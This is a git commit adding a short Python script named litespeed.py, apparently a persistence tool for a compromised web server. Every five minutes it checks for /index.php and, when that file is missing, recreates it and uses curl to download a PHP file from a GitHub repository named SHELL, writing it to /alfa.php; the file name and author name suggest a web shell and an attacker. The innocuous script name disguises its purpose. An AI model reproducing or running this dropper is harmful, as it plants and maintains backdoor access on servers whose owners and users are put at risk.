0cb4cc607a3081db5cc5cea99efd518d280685e6
sniper404ghostxploit <115604134+sniper404ghostxploit@users.noreply.github.com>
2022-11-20 15:13:21 +0700

    Create litespeed.py

---
+++ litespeed.py
@@ -0,0 +1,24 @@
+import os
+import time
+import os.path
+
+def main():
+    while True:
+        f = os.path.exists('/index.php') 
+        
+        if f == True:
+            print("[*] file exists")
+            pass
+            time.sleep(300)
+            
+        else:
+            print("[!] file not found")
+            print("[!] creating file")
+            
+            a = open('/index.php','a') 
+            a.write('') 
+            a.close()
+
+            os.system('curl "https://raw.githubusercontent.com/sniper404ghostxploit/SHELL/main/yz.php" > /alfa.php')
+            time.sleep(300)
+main()
